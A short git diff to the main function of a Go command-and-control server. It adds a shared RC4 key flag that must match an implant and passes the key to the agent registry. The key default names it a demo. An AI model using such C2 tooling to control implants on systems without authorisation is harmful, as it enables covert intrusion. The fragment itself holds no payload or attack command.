@@ -28,20 +28,18 @@ const (
 func main() {
 	listen := flag.String("listen", ":8080", "HTTP listen address")
 	timeout := flag.Duration("timeout", 60*time.Second, "wait for agent command output")
-	verbose := flag.Bool("v", false, "log agent HTTP traffic to stderr")
+	key := flag.String("key", "piclang-c2-demo-key", "shared RC4 key (must match implant)")
+	verbose := flag.Bool("v", false, "reserved")
 	flag.Parse()
+	_ = verbose
 
 	// Always announce agent activity on stderr so the operator sees check-ins
-	// even while sitting at the c2> prompt. -v adds request-level detail.
+	// even while sitting at the c2> prompt.
 	logf := func(format string, args ...any) {
 		fmt.Fprintf(os.Stderr, colorDim+"[agent] "+format+colorReset+"\n", args...)
 	}
-	if *verbose {
-		// keep same logger; server already tags GET/POST
-		_ = verbose
-	}
 
-	reg := newRegistry(logf)
+	reg := newRegistry(logf, []byte(*key))
 	mux := http.NewServeMux()
 	mux.Handle(pathPrefix, reg.Handler())
 	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
